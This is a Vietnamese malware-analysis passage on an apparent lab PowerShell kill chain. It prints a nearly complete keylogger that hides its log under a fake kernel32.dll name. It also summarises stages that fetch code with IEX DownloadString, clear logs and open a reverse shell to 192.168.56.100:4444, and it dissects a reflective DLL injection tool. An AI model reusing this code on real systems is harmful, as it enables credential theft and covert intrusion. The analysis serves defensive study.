├── [3] P/Invoke GetAsyncKeyState (user32.dll)
├── [4] Map phím đặc biệt ($specialKeys — 40+ phím)
├── [5] Map Shift + dấu câu ($shiftMap — 20+ ký tự)
├── [6] Hàm Get-KeyText — chuyển VK → text
├── [7] Hàm Test-RotateLog — rotating khi > 10MB
├── [8] HashSet theo dõi phím đã nhấn
└── [9] Vòng lặp chính:
        ├── Quét VK 8..222
        ├── Ghi phím mới nhấn
        ├── Rotating log mỗi 5s
        └── Sleep 30ms
```


## 9.3. Phân tích từng phần

### 9.3.1. Cấu hình và tạo thư mục ẩn

```powershell
$PublicDir  = "C:\Users\Public\System32"
$LogFile    = "$PublicDir\kernel32.dll"
$MaxLogSize = 10MB

if (-not (Test-Path $PublicDir)) {
    New-Item -Path $PublicDir -ItemType Directory -Force -EA SilentlyContinue | Out-Null
    attrib +h +s $PublicDir 2>$null
}
```

| Thành phần | Phân tích |
|---|---|
| `C:\Users\Public\System32\` | Thư mục **user-writable** (mọi user ghi được, không cần admin) nhưng **tên giả hệ thống** — analyst dễ bỏ qua |
| `kernel32.dll` | Tên **DLL lõi Windows** — file quan trọng, analyst thường không dám xóa |
| `$MaxLogSize = 10MB` | Ngưỡng rotating |
| `attrib +h +s` | Gán thuộc tính **Hidden + System** → file/thư mục **không hiện** trong Explorer mặc định |

**Kỹ thuật cốt lõi:** Masquerading (T1036.005 — Match Legitimate Name or Location). Kẻ tấn công lợi dụng:

- **Tên file hệ thống** (`kernel32.dll`).
- **Tên thư mục hệ thống** (`System32`).
- **Vị trí user-writable** (`C:\Users\Public\`).

→ Nếu analyst chỉ nhìn tên file → tưởng là DLL hợp lệ. Nếu không để ý path → bỏ qua.


### 9.3.2. P/Invoke `GetAsyncKeyState`

```powershell
if (-not ("KeyLogger" -as [type])) {
    Add-Type @"
using System;
using System.Runtime.InteropServices;
public class KeyLogger {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@
}
```

| Thành phần | Phân tích |
|---|---|
| `if (-not ("KeyLogger" -as [type]))` | Kiểm tra class đã tồn tại → **tránh compile lại** nếu keylogger chạy nhiều lần trong cùng process |
| `Add-Type @"..."@` | **Compile C# trong memory** (không ghi file .cs) → fileless |
| `[DllImport("user32.dll")]` | P/Invoke gọi Windows API |
| `GetAsyncKeyState(int vKey)` | API đọc trạng thái phím — trả về `short` (16-bit) |
| `0x8000` (bit cao) | **Phím đang được nhấn** |
| `0x0001` (bit thấp) | Phím vừa được nhấn từ lần gọi trước (không dùng ở đây) |

**Cơ chế hoạt động của `GetAsyncKeyState`:**

- Đây là **API global** — đọc trạng thái phím bất kể focus đang ở đâu.
- Keylogger chạy trong Notepad nhưng **đọc được phím gõ trong mọi app** (browser, email, banking...).
- **Polling** — phải gọi liên tục để không miss phím.


#### Hạn chế của `GetAsyncKeyState`:

- **Không đọc được phím trong elevated process** nếu keylogger chạy user-level (UIPI — User Interface Privilege Isolation).
- **Bị EDR hook** — nhiều EDR hiện đại hook API này để phát hiện keylogger.
- **Không xử lý IME** — không bắt được tiếng Việt có dấu, tiếng Trung, tiếng Nhật.

### 9.3.3. Map phím đặc biệt

```powershell
$specialKeys = @{
    8   = "[BACKSPACE]"
    9   = "[TAB]"
    13  = "[ENTER]`n"
    16  = "[SHIFT]"
    ...
    186 = ";"
    187 = "="
    188 = ","
    189 = "-"
    190 = "."
    191 = "/"
    192 = "``"
    219 = "["
    220 = "\"
    221 = "]"
    222 = "'"
}
112..123 | ForEach-Object { $specialKeys[$_] = "[F$($_ - 111)]" }
```

**Phân nhóm:**

| Nhóm VK | Phím | Xử lý |
|---|---|---|
| 8-9 | Backspace, Tab | Tag đặc biệt `[BACKSPACE]`, `[TAB]` |
| 13 | Enter | `[ENTER]` + newline → **phân tách dòng log** |
| 16-18 | Shift, Ctrl, Alt | Tag để phân tích context |
| 19-20 | Pause, CapsLock | Tag |
| 27 | Esc | Tag |
| 32 | Space | Khoảng trắng thật (không tag) |
| 33-40 | Navigation (PgUp, PgDn, End, Home, Arrow) | Tag |
| 44-46 | PrtSc, Ins, Del | Tag |
| 91-93 | Win, Menu | Tag |
| 106-111 | Numpad ops (`*`, `+`, `-`, `.`, `/`) | Ký tự thật |
| 112-123 | F1-F12 | Tag `[F1]`...`[F12]` |
| 144-145 | NumLock, ScrollLock | Tag |
| 186-222 | Dấu câu (không Shift) | Ký tự gốc (`;`, `=`, `,`, `-`, `.`, `/`, `\`, `[`, `]`, `'`, `` ` ``) |

**Điểm quan trọng:** `13 = "[ENTER]`n"` — Enter ghi thành `[ENTER]` + newline → log dễ đọc, mỗi dòng là một lần Enter → attacker dễ phân tích phiên gõ (user gõ username → Enter → password → Enter).


### 9.3.4. Map Shift + dấu câu

```powershell
$shiftMap = @{
    48=')'; 49='!'; 50='@'; 51='#'; 52='$'; 53='%'; 54='^'; 55='&'; 56='*'; 57='('
    186=':'; 187='+'; 188='<'; 189='_'; 190='>'; 191='?'
    192='~'; 219='{'; 220='|'; 221='}'; 222='"'
}
```

**Bảng đầy đủ:**

| VK | Không Shift | Có Shift |
|---|---|---|
| 48–57 | `0`–`9` | `)` `!` `@` `#` `$` `%` `^` `&` `*` `(` |
| 186 | `;` | `:` |
| 187 | `=` | `+` |
| 188 | `,` | `<` |
| 189 | `-` | `_` |
| 190 | `.` | `>` |
| 191 | `/` | `?` |
| 192 | `` ` `` | `~` |
| 219 | `[` | `{` |
| 220 | `\` | `\|` |
| 221 | `]` | `}` |
| 222 | `'` | `"` |

**Tầm quan trọng:** Đây là bộ ký tự đặc biệt đầy đủ để bắt password mạnh:


- `P@ssw0rd!` → bắt đầy đủ.
- `Admin#2026` → bắt đầy đủ.
- `aB{c}d[e]f` → bắt đầy đủ.

Nếu thiếu bảng này → password mạnh bị mất ký tự → attacker không đăng nhập được.

### 9.3.5. Hàm `Get-KeyText` — logic chuyển VK → text

```powershell
function Get-KeyText([int]$vk) {
    # 1. Phím đặc biệt
    if ($specialKeys.ContainsKey($vk)) { return $specialKeys[$vk] }

    # 2. Đọc trạng thái Shift và CapsLock
    $shift = ([KeyLogger]::GetAsyncKeyState(16) -band 0x8000) -ne 0
    $caps  = ([KeyLogger]::GetAsyncKeyState(20) -band 0x8000) -ne 0

    # 3. A-Z: HOA nếu Shift XOR CapsLock
    if ($vk -ge 65 -and $vk -le 90) {
        $ch = [char]$vk
        if ($shift -xor $caps) { return $ch.ToString() }
        else                  { return $ch.ToString().ToLower() }
    }

    # 4. 0-9: Shift → ký tự đặc biệt
    if ($vk -ge 48 -and $vk -le 57) {
        if ($shift) { return $shiftMap[$vk] }
        return [string]$vk
    }

    # 5. Numpad 0-9
    if ($vk -ge 96 -and $vk -le 105) { return [string]($vk - 96) }

    # 6. Dấu câu có Shift
    if ($shiftMap.ContainsKey($vk) -and $shift) { return $shiftMap[$vk] }

    return ""
}
```


**Phân tích logic chữ hoa/thường — `$shift -xor $caps`:**

| Shift | Caps | XOR | Kết quả | Ví dụ |
|---|---|---|---|---|
| 0 | 0 | 0 | `ToLower()` → thường | `a` |
| 1 | 0 | 1 | **Hoa** | `A` |
| 0 | 1 | 1 | **Hoa** | `A` |
| 1 | 1 | 0 | `ToLower()` → thường | `a` |

**Logic này ĐÚNG** — khớp với hành vi thực tế của Windows:

- CapsLock ON + Shift → chữ thường (Shift "tắt" CapsLock).
- CapsLock OFF + Shift → chữ hoa.
- Cả hai ON hoặc cả hai OFF → ngược lại.

**Thứ tự ưu tiên trong hàm:**

1. **Phím đặc biệt trước** — vì nhiều phím đặc biệt (Enter, Tab, F1...) không cần xét Shift/Caps.
2. **A-Z** — xét Shift/Caps.
3. **0-9 row** — xét Shift.
4. **Numpad** — không xét Shift (numpad thường không bị ảnh hưởng Shift).
5. **Dấu câu + Shift** — chỉ trả về ký tự đặc biệt nếu có Shift.
6. **Fallback** — trả về `""` (không ghi gì).

**Lưu ý:** dấu câu không Shift đã được map trong `$specialKeys` (VK 186-222) → trả về ký tự gốc. Chỉ khi có Shift mới dùng `$shiftMap`.


### 9.3.6. Rotating log

```powershell
function Test-RotateLog {
    if (Test-Path $LogFile) {
        $size = (Get-Item $LogFile -EA SilentlyContinue).Length
        if ($size -gt $MaxLogSize) {
            $backup = "$PublicDir\kernel32_$(Get-Date -Format 'yyyyMMdd_HHmmss').dll"
            Move-Item $LogFile $backup -Force -EA SilentlyContinue
            Get-ChildItem "$PublicDir\kernel32_*.dll" -EA SilentlyContinue |
                Sort-Object LastWriteTime -Descending |
                Select-Object -Skip 5 |
                Remove-Item -Force -EA SilentlyContinue
        }
    }
}
```

**Cơ chế:**

1. Nếu file log > 10MB → đổi tên thành `kernel32_YYYYMMDD_HHMMSS.dll` (backup).
2. Giữ **tối đa 5 backup** — backup cũ hơn bị xóa.

**Mục đích:**

- **Tránh file phình to** — nếu user dùng máy nhiều ngày, file log có thể hàng trăm MB → dễ bị phát hiện qua file size monitoring.
- **Giữ log gần đây** — 5 backup × 10MB = tối đa 50MB → đủ cho vài ngày gõ.
- **Tự dọn** — không chiếm disk.

**Tên backup `kernel32_*.dll`** — vẫn masquerading (trông giống DLL hệ thống với timestamp).


### 9.3.7. HashSet theo dõi phím đã nhấn

```powershell
$pressed = New-Object 'System.Collections.Generic.HashSet[int]'
```

**Mục đích:** tránh repeat — vì `GetAsyncKeyState` trả về `0x8000` liên tục khi phím đang giữ → nếu không track, sẽ ghi hàng trăm lần/giây.

**Logic trong vòng lặp:**

- **Phím mới nhấn** (`0x8000` và chưa có trong HashSet) → ghi + thêm vào HashSet.
- **Phím giữ** (đã có trong HashSet) → **không ghi**.
- **Phím nhả** (không còn `0x8000`) → xóa khỏi HashSet.

**Tại sao dùng `HashSet[int]` thay vì hashtable `@{}`:**

- **Nhanh hơn** — O(1) lookup, ít memory hơn (chỉ lưu key, không lưu value).
- **Type-safe** — chỉ nhận int.
- **Quan trọng** vì vòng lặp chạy 33 lần/giây × 215 VK = ~7000 lookup/giây.


### 9.3.8. Vòng lặp chính

```powershell
$counter = 0
while ($true) {
    for ($vk = 8; $vk -le 222; $vk++) {
        try {
            $state = [KeyLogger]::GetAsyncKeyState($vk)
            if (($state -band 0x8000) -ne 0) {
                if (-not $pressed.Contains($vk)) {
                    [void]$pressed.Add($vk)
                    $txt = Get-KeyText $vk
                    if ($txt -ne "") {
                        try { [System.IO.File]::AppendAllText($LogFile, $txt) } catch { }
                    }
                }
            } else {
                if ($pressed.Contains($vk)) { [void]$pressed.Remove($vk) }
            }
        } catch {}
    }

    $counter++
    if ($counter -ge 166) {
        $counter = 0
        Test-RotateLog
    }

    Start-Sleep -Milliseconds 30
}
```

**Phân tích chi tiết:**


| Thành phần | Ý nghĩa |
|---|---|
| `while ($true)` | Vòng lặp vô hạn — chạy đến khi process bị kill |
| `for ($vk = 8; $vk -le 222; $vk++)` | Quét **215 virtual key codes** — từ Backspace (8) đến phím cuối (222) |
| `[KeyLogger]::GetAsyncKeyState($vk)` | Đọc trạng thái phím |
| `-band 0x8000` | Kiểm tra bit cao (phím đang nhấn) |
| `[void]$pressed.Add($vk)` | Thêm vào HashSet, nuốt output (tránh in True/False) |
| `[System.IO.File]::AppendAllText(...)` | Ghi nối vào file — **không ghi đè** |
| `try/catch` trong vòng lặp | Bỏ qua lỗi từng phím (nếu file bị khóa) |
| `try/catch` ngoài `AppendAllText` | Bỏ qua lỗi ghi file |
| `$counter >= 166` | ~166 vòng × 30ms = **~5 giây** → gọi `Test-RotateLog` |
| `Start-Sleep -Milliseconds 30` | Nghỉ 30ms giữa các lần quét |

#### Tại sao quét `8..222`?

- **8** = Backspace (phím đầu tiên có ý nghĩa).
- **222** = phím cuối cùng của bàn phím US (dấu `'`).
- **Bỏ qua 0–7** (mouse buttons — không cần).
- **Bỏ qua > 222** (một số phím media/đặc biệt ít dùng).

#### Tại sao `Sleep 30ms`?

- **30ms = ~33 lần quét/giây** → đủ nhanh để bắt hầu hết phím (người gõ nhanh nhất ~10 phím/giây).
- **Không sleep** → CPU 100% → dễ bị phát hiện.
- **Sleep lâu hơn (100ms)** → có thể miss phím nếu gõ nhanh.

#### Tại sao dùng `[System.IO.File]::AppendAllText` thay vì `Out-File -Append`?

- `AppendAllText` là **.NET method** — nhanh hơn, không qua pipeline PowerShell.
- `Out-File` mở/đóng file mỗi lần → chậm hơn, dễ bị lock.
- `AppendAllText` atomic hơn — ít bị mất dữ liệu nếu process bị kill.


## 9.4. Luồng hoạt động

```txt
[Stage 5] orchestrator.ps1
    │
    ▼
Invoke-PSInject -ProcId $np.Id -PoshCode $StubB64
    │
    ▼
[Notepad.exe memory]
    │
    ├── Stub chạy → tải keylogger.ps1 từ C2
    │
    ▼
keylogger.ps1 (chạy trong process Notepad)
    │
    ├── Tạo C:\Users\Public\System32\ (ẩn)
    ├── Add-Type GetAsyncKeyState
    │
    └── while ($true):
            ├── Quét VK 8..222
            ├── Phím mới nhấn → Get-KeyText → AppendAllText
            ├── Phím nhả → xóa khỏi HashSet
            ├── Mỗi 5s → Test-RotateLog
            └── Sleep 30ms
```

## 9.5. Tóm tắt toàn bộ kill chain (9 stage — HOÀN CHỈNH)

```txt
[Stage 0]   Invoice_October.hta
                │ VBScript → PowerShell an
                ▼
[Stage 0.5] powershell.exe → IEX DownloadString('.../loader.ps1')
                │
                ▼
[Stage 1]   loader.ps1 (downloader)
                │
                ▼
[Stage 1.5] stage1.ps1
                ├── UAC Bypass (ms-settings + ComputerDefaults.exe)
                └── IEX DownloadString('.../stage2.ps1')
                        │
                        ▼
[Stage 2]   stage2.ps1 (ANTI-FORENSIC)
                ├── Tat 3 PowerShell logging policies
                ├── Disable 4 event channels (gom Sysmon)
                ├── Kill other PowerShell
                ├── Clear 7 log (2 lan)
                └── Spawn PowerShell MOI → tai stage3.ps1
                        │
                        ▼
[Stage 3]   stage3.ps1 (REGISTRY STAGING + SELF-CLEANUP)
                ├── Base64 → ghi HKCU\Software\Classes\Discord\Payload
                ├── Verify → decode → IEX
                ├── XOA registry
                │       │
                │       ▼
                │   [Stage 4] wmi_setup.ps1 (WMI PERSISTENCE)
                │       ├── __EventFilter (NotepadTrigger)
                │       ├── CommandLineEventConsumer (powershell -Enc ...)
                │       └── __FilterToConsumerBinding
                │               │
                │               ▼
                │       [Moi lan user mo Notepad]
                │               │
                │               ▼
                │       [Stage 5] orchestrator.ps1 (PAYLOAD CUOI)
                │               ├── [1] RevShell → Win32_Process.Create
                │               │       │
                │               │       ▼
                │               │   [Stage 6] revshell.ps1
                │               │       ├── while ($true):
                │               │       │   ├── TcpClient::new('192.168.56.100', 4444)
                │               │       │   ├── iex $data → thuc thi lenh
                │               │       │   └── gui output ve C2
                │               │       └── retry 30s
                │               │
                │               ├── [2] Tai Invoke-PSInject.ps1
                │               ├── [3] Build stub keylogger
                │               ├── [4] Inject stub vao Notepad
                │               │       │
                │               │       ▼
                │               │   [Stage 7] keylogger.ps1  ← FILE NAY
                │               │       ├── Log: C:\Users\Public\System32\kernel32.dll
                │               │       ├── GetAsyncKeyState polling 30ms
                │               │       ├── Xu ly Shift/CapsLock DUNG
                │               │       ├── Day du dau cau
                │               │       ├── Rotating log > 10MB
                │               │       └── Ghi moi phim vao log
                │               │
                │               ├── [5] Clear PowerShell log
                │               └── [6] Scheduled Task "SysLogMaint"
                │
                └── Clear 4 log
```

# 10. Invoke-PSInject.ps1

## 10.1 Tổng quan kiến trúc

Phân tích `Invoke-PSInject.ps1` — Reflective DLL Injection Tool:

Đây là **tool inject PowerShell code vào process khác** — được `orchestrator.ps1` tải về và dùng để inject stub keylogger vào `notepad.exe`. Đây là **công cụ tấn công hoàn chỉnh**, không phải script đơn giản.

**Nguồn gốc:** Đây là **biến thể của PowerSploit `Invoke-ReflectivePEInjection`** — một trong những tool post-exploitation nổi tiếng nhất. Tác giả gốc: **Matt Graeber (@mattifestation) và Joe Bialek**. Code đã được custom để phục vụ mục đích cụ thể (inject PowerShell code, không phải PE).


```txt
Invoke-PSInject.ps1
├── Invoke-PSInject (hàm chính)
│   ├── Decode Base64 PoshCode
│   ├── Invoke-PatchDll (patch code vào DLL template)
│   ├── Main → RemoteScriptBlock (chạy trên target)
│   │   ├── Get-Win32Types (định nghĩa struct/enum)
│   │   ├── Get-Win32Constants
│   │   ├── Get-Win32Functions (resolve API)
│   │   ├── Invoke-MemoryLoadLibrary (reflective load)
│   │   │   ├── Copy-Sections
│   │   │   ├── Update-MemoryAddresses
│   │   │   ├── Import-DllImports
│   │   │   └── Update-MemoryProtectionFlags
│   │   ├── Get-MemoryProcAddress
│   │   ├── Invoke-MemoryFreeLibrary
│   │   └── Create-RemoteThread
│   └── Chứa 2 PE template (PEBytes64, PEBytes32) — base64
│
├── New-InMemoryModule (tạo .NET assembly trong memory)
├── func (helper định nghĩa hàm Win32)
├── Add-Win32Type (tạo P/Invoke type)
├── psenum (tạo enum)
├── field (helper định nghĩa field struct)
├── struct (tạo struct)
│
├── EnumProcesses (tìm process integrity cao)
└── Inject (wrapper)
```


## 10.2. Phân tích hàm chính `Invoke-PSInject`

### 10.2.1. Tham số

```powershell
Param(
    [Parameter(Position = 1)] [String[]] $ComputerName,
    [Parameter(Position = 2)] [ValidateSet('WString','String','Void','Other')] [String] $FuncReturnType = 'Other',
    [Parameter(Position = 3)] [String] $ExeArgs,
    [Parameter(Position = 4)] [Int32] $ProcId,
    [Parameter(Position = 5)] [String] $ProcName,
    [Parameter(Position = 6, Mandatory = $true)] [ValidateLength(1,1200)] [String] $PoshCode,
    [Parameter(Position = 7)] [Switch] $ForceASLR
)
```

| Tham số | Mục đích |
|---|---|
| `$ProcId` | PID process đích (Notepad) |
| `$ProcName` | Tên process đích (thay thế PID) |
| `$PoshCode` | **Base64-encoded PowerShell code** cần inject — giới hạn **1200 ký tự** |
| `$ComputerName` | Inject từ xa qua `Invoke-Command` (PSRemoting) |
| `$ForceASLR` | Force ASLR cho DLL template |

**Điểm quan trọng:** `[ValidateLength(1,1200)]` — giới hạn **1200 ký tự Base64 (~900 byte code)**. Đây là lý do tại sao `orchestrator.ps1` dùng **stub downloader** thay vì inject thẳng keylogger — keylogger thật dài hơn 1200 ký tự.

### 10.2.2. Decode Base64

```powershell
$PoshCode = [System.Text.Encoding]::UNICODE.GetString([System.Convert]::FromBase64String($PoshCode))
```

- **Decode Base64 → UTF-16LE string → PowerShell code gốc.**
- **Tại sao UTF-16LE?** Vì `-Enc` của PowerShell dùng UTF-16LE. Đây là chuẩn của `powershell.exe -EncodedCommand`.


### 10.2.3. `Invoke-PatchDll` — patch code vào DLL template

```powershell
function Invoke-PatchDll {
    Param([Byte[]]$DllBytes, [string]$FindString, [string]$ReplaceString)

    $FindStringBytes = ([system.Text.Encoding]::UNICODE).GetBytes($FindString)
    $ReplaceStringBytes = ([system.Text.Encoding]::UNICODE).GetBytes($ReplaceString)

    $index = 0
    $s = [System.Text.Encoding]::UNICODE.GetString($DllBytes)
    $index = $s.IndexOf($FindString) * 2  # *2 vì UTF-16LE = 2 bytes/char

    if($index -eq 0) { throw("Could not find string $FindString !") }

    for ($i=0; $i -lt $ReplaceStringBytes.Length; $i++) {
        $DllBytes[$index+$i] = $ReplaceStringBytes[$i]
    }

    # null terminate
    $DllBytes[$index+$ReplaceStringBytes.Length] = [byte]0x00
    $DllBytes[$index+$ReplaceStringBytes.Length+1] = [byte]0x00

    return $DllBytes
}
```

**Cơ chế hoạt động:**

1. **Tìm string `"Invoke-Replace"`** trong DLL template (base64 decode từ `$PEBytes64`).
2. **Thay thế bằng `$PoshCode`** (PowerShell code cần inject).
3. **Null-terminate** string mới (2 byte `0x00 0x00` cho UTF-16LE).

**Tại sao phải patch?**

- DLL template (`PowerShellRunner.dll`) là **ReflectivePick DLL** — một DLL C++ có sẵn hàm `VoidFunc` và một placeholder string `"Invoke-Replace"`.
- Khi patch `"Invoke-Replace"` → `$PoshCode`, DLL sẽ chạy PowerShell code khi được load.
- Đây là kỹ thuật **"DLL template + code patch"** — không cần compile DLL mới, chỉ cần patch bytes.

**Lưu ý:** `$RawBytes` trong `Invoke-PatchDll` là biến global (không khai báo trong function) — có thể là bug hoặc cố ý (dùng biến từ scope ngoài). Trong code gốc PowerSploit, đây là `$DllBytes`.


## 10.3. `RemoteScriptBlock` — phần chạy trên target

Đây là **script block khổng lồ (~2000 dòng)** thực hiện **reflective DLL injection**. Được chạy trên **target process** (qua `Invoke-Command` nếu remote, hoặc local nếu `$ComputerName` rỗng).

### 10.3.1. `Get-Win32Types` — định nghĩa struct/enum

Định nghĩa tất cả **struct/enum cần thiết cho PE loading**:

| Struct/Enum | Mục đích |
|---|---|
| `MachineType` | `I386`, `x64`, `Itanium` |
| `MagicType` | `IMAGE_NT_OPTIONAL_HDR32_MAGIC`, `IMAGE_NT_OPTIONAL_HDR64_MAGIC` |
| `SubSystemType` | `WINDOWS_GUI`, `WINDOWS_CUI`, ... |
| `DllCharacteristicsType` | `DYNAMIC_BASE`, `NX_COMPAT`, ... |
| `IMAGE_DATA_DIRECTORY` | Data directory entry |
| `IMAGE_FILE_HEADER` | PE file header |
| `IMAGE_OPTIONAL_HEADER32/64` | Optional header (32/64-bit) |
| `IMAGE_NT_HEADERS32/64` | NT headers |
| `IMAGE_DOS_HEADER` | DOS header (`MZ`) |
| `IMAGE_SECTION_HEADER` | Section header |
| `IMAGE_BASE_RELOCATION` | Base relocation entry |
| `IMAGE_IMPORT_DESCRIPTOR` | Import descriptor |
| `IMAGE_EXPORT_DIRECTORY` | Export directory |
| `LUID`, `LUID_AND_ATTRIBUTES`, `TOKEN_PRIVILEGES` | Token privileges (cho SeDebugPrivilege) |

**Kỹ thuật:** Dùng `System.Reflection.Emit` để define type trong memory — không cần compile C#. Đây là kỹ thuật của Matt Graeber (`New-InMemoryModule`, `struct`, `psenum`).


### 10.3.2. `Get-Win32Constants` — định nghĩa constants

Các hằng số cho memory allocation, protection, relocation:

```powershell
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x40
IMAGE_REL_BASED_HIGHLOW = 3
IMAGE_REL_BASED_DIR64 = 10
...
```

### 10.3.3. `Get-Win32Functions` — resolve API

Resolve địa chỉ các hàm Win32 cần thiết qua `GetProcAddress`:


| API | Mục đích |
|---|---|
| `VirtualAlloc`, `VirtualAllocEx` | Cấp phát memory |
| `VirtualFree`, `VirtualFreeEx` | Giải phóng memory |
| `VirtualProtect` | Đổi protection (RW → RX) |
| `LoadLibraryA` | Load DLL |
| `GetProcAddress` | Lấy địa chỉ hàm |
| `GetModuleHandleA` | Lấy handle module |
| `OpenProcess` | Mở process đích |
| `WriteProcessMemory` | Ghi vào process đích |
| `ReadProcessMemory` | Đọc từ process đích |
| `CreateRemoteThread` | Tạo thread trong process đích |
| `WaitForSingleObject` | Chờ thread |
| `GetExitCodeThread` | Lấy exit code |
| `NtCreateThreadEx` | Tạo thread (Vista/7) |
| `IsWow64Process` | Kiểm tra 32/64-bit |
| `CreateThread` | Tạo thread local |
| `OpenThreadToken`, `AdjustTokenPrivileges`, `LookupPrivilegeValue`, `ImpersonateSelf` | SeDebugPrivilege |

**Kỹ thuật:** Dùng `GetProcAddress` + `GetDelegateForFunctionPointer` để gọi API trực tiếp — không qua P/Invoke declaration. Đây là **dynamic API resolution** — tránh bị AV/EDR hook qua static import.


### 10.3.4. Helpers

| Helper | Mục đích |
|---|---|
| `Sub-SignedIntAsUnsigned` | Trừ số nguyên có dấu như unsigned (tính địa chỉ memory) |
| `Add-SignedIntAsUnsigned` | Cộng số nguyên có dấu như unsigned |
| `Compare-Val1GreaterThanVal2AsUInt` | So sánh unsigned |
| `Convert-UIntToInt` | Chuyển UInt64 → Int64 |
| `Get-Hex` | Format hex |
| `Test-MemoryRangeValid` | Kiểm tra range memory hợp lệ |
| `Write-BytesToMemory` | Ghi bytes vào memory |
| `Get-DelegateType` | Tạo delegate type động (Matt Graeber) |
| `Get-ProcAddress` | Resolve API address (Matt Graeber) |
| `Enable-SeDebugPrivilege` | Bật SeDebugPrivilege (đã comment out trong Main) |
| `Create-RemoteThread` | Tạo remote thread (dùng `NtCreateThreadEx` cho Vista/7, `CreateRemoteThread` cho XP/8+) |

### 10.3.5. `Get-ImageNtHeaders` — parse PE headers

```powershell
$dosHeader = [Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)
[IntPtr]$NtHeadersPtr = Add-SignedIntAsUnsigned $PEHandle, $dosHeader.e_lfanew
$imageNtHeaders64 = [Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
```

- Đọc `IMAGE_DOS_HEADER` từ memory.
- Tính offset đến `IMAGE_NT_HEADERS` qua `e_lfanew`.
- Kiểm tra `Signature == 0x00004550` (`PE\0\0`).
- Kiểm tra `Magic` để xác định 32/64-bit.


### 10.3.6. `Get-PEBasicInfo` / `Get-PEDetailedInfo`

Trích xuất thông tin PE:

- `OriginalImageBase`, `SizeOfImage`, `SizeOfHeaders`, `DllCharacteristics`
- `FileType` (DLL/EXE)
- `SectionHeaderPtr`, `NtHeadersPtr`

### 10.3.7. `Import-DllInRemoteProcess`

Load DLL vào process đích (dùng cho import table):

- **32-bit:** `CreateRemoteThread` + `LoadLibraryA` → `GetExitCodeThread` lấy địa chỉ DLL.
- **64-bit:** **Không dùng được** `CreateRemoteThread` vì `GetExitCodeThread` chỉ trả về 32-bit → phải dùng shellcode:
  - Viết shellcode gọi `LoadLibraryA`, lưu kết quả vào memory.
  - Đọc kết quả từ memory qua `ReadProcessMemory`.

**Shellcode 64-bit (`LoadLibraryA.asm`):**

```asm
push rbx
mov rbx, rsp
sub rsp, 20h
and rsp, -40
mov rcx, <DLL path ptr>
mov rdx, <LoadLibraryA addr>
call rdx
mov rdx, <return buffer ptr>
mov [rdx], rax
mov rsp, rbx
pop rbx
ret
```

### 10.3.8. `Get-RemoteProcAddress`

Lấy địa chỉ hàm trong DLL đã load ở remote process:

- **32-bit:** `CreateRemoteThread` + `GetProcAddress` + `GetExitCodeThread`.
- **64-bit:** shellcode tương tự `Import-DllInRemoteProcess`.


### 10.3.9. `Copy-Sections`

Copy từng section từ PE bytes vào memory đã cấp phát:

```powershell
for($i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++) {
    $SectionHeader = PtrToStructure($SectionHeaderPtr, IMAGE_SECTION_HEADER)
    $SectionDestAddr = $PEInfo.PEHandle + $SectionHeader.VirtualAddress
    $SizeOfRawData = min($SectionHeader.SizeOfRawData, $SectionHeader.VirtualSize)
    Marshal::Copy($PEBytes, $SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
    # Nếu VirtualSize > SizeOfRawData → zero-fill phần còn lại
    if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize) {
        $Win32Functions.memset.Invoke($StartAddress, 0, $Difference)
    }
}
```

- Copy từng section vào đúng `VirtualAddress`.
- **Zero-fill** nếu `VirtualSize > SizeOfRawData` (BSS section).

### 10.3.10. `Update-MemoryAddresses` — base relocation

Xử lý base relocation — điều chỉnh địa chỉ nếu PE được load không đúng `OriginalImageBase`:

```powershell
$BaseDifference = Sub-SignedIntAsUnsigned($OriginalImageBase, $PEInfo.EffectivePEHandle)
# hoặc ngược lại
```

- Duyệt `IMAGE_BASE_RELOCATION` table.
- Với mỗi entry `IMAGE_REL_BASED_HIGHLOW` (32-bit) hoặc `IMAGE_REL_BASED_DIR64` (64-bit):
  - Đọc địa chỉ hiện tại.
  - Cộng/trừ `$BaseDifference`.
  - Ghi lại.

**Đây là bước quan trọng nhất của reflective loading** — nếu không làm, DLL sẽ crash khi gọi hàm.


### 10.3.11. `Import-DllImports`

Xử lý import table — load các DLL mà PE cần:

```powershell
while ($true) {
    $ImportDescriptor = PtrToStructure($ImportDescriptorPtr, IMAGE_IMPORT_DESCRIPTOR)
    if (ImportDescriptor.Characteristics -eq 0 -and ... ) { break }

    $ImportDllPath = PtrToStringAnsi($PEHandle + $ImportDescriptor.Name)
    $ImportDllHandle = LoadLibrary($ImportDllPath)  # hoặc Import-DllInRemoteProcess
    # Duyệt thunk, resolve từng function qua GetProcAddress
    while ($OriginalThunkRefVal -ne 0) {
        $NewThunkRef = GetProcAddress($ImportDllHandle, $ProcedureName)
        StructureToPtr($NewThunkRef, $ThunkRef, $false)
        ...
    }
}
```

- Duyệt `IMAGE_IMPORT_DESCRIPTOR` array.
- Load từng DLL qua `LoadLibrary` (local) hoặc `Import-DllInRemoteProcess` (remote).
- Resolve từng function qua `GetProcAddress`, ghi vào IAT (Import Address Table).
- Hỗ trợ load by ordinal (nếu bit cao của thunk được set).

### 10.3.12. `Update-MemoryProtectionFlags`

Đổi protection của từng section:

- `IMAGE_SCN_MEM_EXECUTE | READ | WRITE` → `PAGE_EXECUTE_READWRITE`
- `IMAGE_SCN_MEM_EXECUTE | READ` → `PAGE_EXECUTE_READ`
- `IMAGE_SCN_MEM_READ | WRITE` → `PAGE_READWRITE`
- `IMAGE_SCN_MEM_READ` → `PAGE_READONLY`

**Mục đích:** đảm bảo section có đúng quyền (code = RX, data = RW) → tránh bị phát hiện qua `PAGE_EXECUTE_READWRITE` bất thường.


### 10.3.13. `Update-ExeFunctions` — chỉ cho EXE

Nếu load EXE (không phải DLL):

- **Overwrite `GetCommandLineA/W`** → trả về `$ExeArgs` (giả command line).
- **Overwrite `_acmdln` / `_wcmdln`** trong msvcr*.dll.
- **Overwrite `CorExitProcess` / `ExitProcess`** → gọi `ExitThread` thay vì kill process.

**Mục đích:** EXE load reflectively sẽ chạy trong **thread riêng** — không kill PowerShell process khi EXE exit.

### 10.3.14. `Invoke-MemoryLoadLibrary` — hàm chính

